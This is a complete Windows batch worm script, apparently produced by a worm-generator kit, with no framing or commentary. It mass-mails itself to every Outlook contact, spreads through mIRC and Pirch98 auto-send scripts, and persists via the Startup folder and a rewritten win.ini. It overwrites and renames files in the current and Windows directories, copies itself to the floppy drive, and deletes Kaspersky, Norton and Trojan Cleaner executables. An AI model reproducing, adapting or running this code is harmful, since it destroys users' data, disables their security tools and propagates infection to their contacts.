@echo off
REM Name:     report        
REM Author:   domi          
REM generated with BATCH WORM GENERATOR 1.07
ctty nul
Set MyS=%0
copy %MyS% file.bat
copy file.bat C:\
copy file.bat C:\email.vbs
echo Dim x > C:\email.vbs
echo.on error resume next >> C:\email.vbs
echo Set fso =" Scripting.FileSystem.Object" >> C:\email.vbs
echo Set so=CreateObject(fso) >> C:\email.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\email.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\email.vbs
echo Set mapi = out.GetNameSpace("MAPI") >> C:\email.vbs
echo Set a = mapi.AddressLists(1) >> C:\email.vbs
echo For x=1 To a.AddressEntries.Count >> C:\email.vbs
echo Set Mail=ol.CreateItem(0) >> C:\email.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\email.vbs
echo Mail.Subject="xxx" >> C:\email.vbs
echo Mail.Body="xxx" >> C:\email.vbs
echo Mail.Attachments.Add("C:\") >> C:\email.vbs
echo Mail.Send >> C:\email.vbs
echo Next >> C:\email.vbs
echo ol.Quit >> C:\email.vbs
cscript C:\email.vbs
@del C:\email.vbs
@del C:\
md C:\pro
copy file.bat C:\pro\y
if exist C:\mirc\script.ini set mIRC=C:\mirc\script.ini
if exist C:\mirc32\script.ini set mIRC=C:\mirc32\script.ini
if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\script.ini
set spp=dcc send $nick C:\pro\y
echo [script] > %mIRC%
echo n0=on 1:filesent:*.*: { if ( $nick !=$me ) {halt} /%spp% } >>%mIRC%
if exist C:\pirch98\events.ini goto pir
goto pirend
:pir
copy file.bat %WinDir%\y
echo [Levels] > C:\Pirch98\events.ini
echo Enabled=1 >> C:\Pirch98\events.ini
echo Count=6 >> C:\Pirch98\events.ini
echo Level1=000-Unknows >> C:\Pirch98\events.ini
echo 000-UnknowsEnabled=1 >> C:\Pirch98\events.ini
echo Level2=100-Level 100 >> C:\Pirch98\events.ini
echo 100-Level 100Enabled=1 >> C:\Pirch98\events.ini
echo Level3=200-Level 200 >> C:\Pirch98\events.ini
echo 200-Level 200Enabled=1 >> C:\Pirch98\events.ini
echo Level4=300-Level 300 >> C:\Pirch98\events.ini
echo 300-Level 300Enabled=1 >> C:\Pirch98\events.ini
echo Level5=400-Level 400 >> C:\Pirch98\events.ini
echo 400-Level 400Enabled=1 >> C:\Pirch98\events.ini
echo Level6=500-Level 500 >> C:\Pirch98\events.ini
echo 500-Level 500Enabled=1 >> C:\Pirch98\events.ini
echo [000-Unknowns] >> C:\Pirch98\events.ini
echo User1=*!*@* >> C:\Pirch98\events.ini
echo UserCount=1 >> C:\Pirch98\events.ini
echo Events1= ON JOIN:#: /dcc send $nick %WinDir%\y >> C:\Pirch98\events.ini
echo EventCount=1 >> C:\Pirch98\events.ini
echo [100-Level 100] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [200-Level 200] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [300-Level 300] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [400-Level 400] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [500-Level 500] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
:pirend
copy file.bat C:\Affe.zyy
ren C:\Affe.zyy AS.bat
move C:\AS.bat %windir%\startm~1\progra~1\autost~1
copy file.bat %windir%\Start Menu\Programs\StartUp\StartUp.bat
md C:\suPs
copy file.bat C:\suPs\olaf.xyv
ren C:\suPs\olaf.xyv snake.bat
subst L: C:\suPs
for %%v in (*.*) do copy file.bat C:\hamlet.bat
for %%v in (*.*) do copy C:\hamlet.bat %%v
for %%v in (*.*) do ren *.* *.bat
@del C:\hamlet.bat
copy file.bat C:\wd.bat
for %%w in (%windir%\*.bat) do copy C:\wd.bat %%w
@del C:\wd.bat
copy file.bat %WinDir%\system\WINI.bat
echo [windows] >funny.bat
echo load=%windir%\system\WINI.bat >>funny.bat
echo run=%windir%\system\WINI.bat >>funny.bat
echo NullPort=None >>funny.bat
copy funny.bat %windir%\dd.ini
@del %windir%\win.ini
@del funny.bat
ren %windir%\dd.ini win.ini
copy file.bat %windir%\Desktop\*.bat
command /f /c copy file.bat A:\
@del file.bat
@del C:\progra~1\kasper~1\avp32.exe
@del C:\progra~1\norton~1\*.exe
@del C:\progra~1\trojan~1\tc.exe
ctty CON
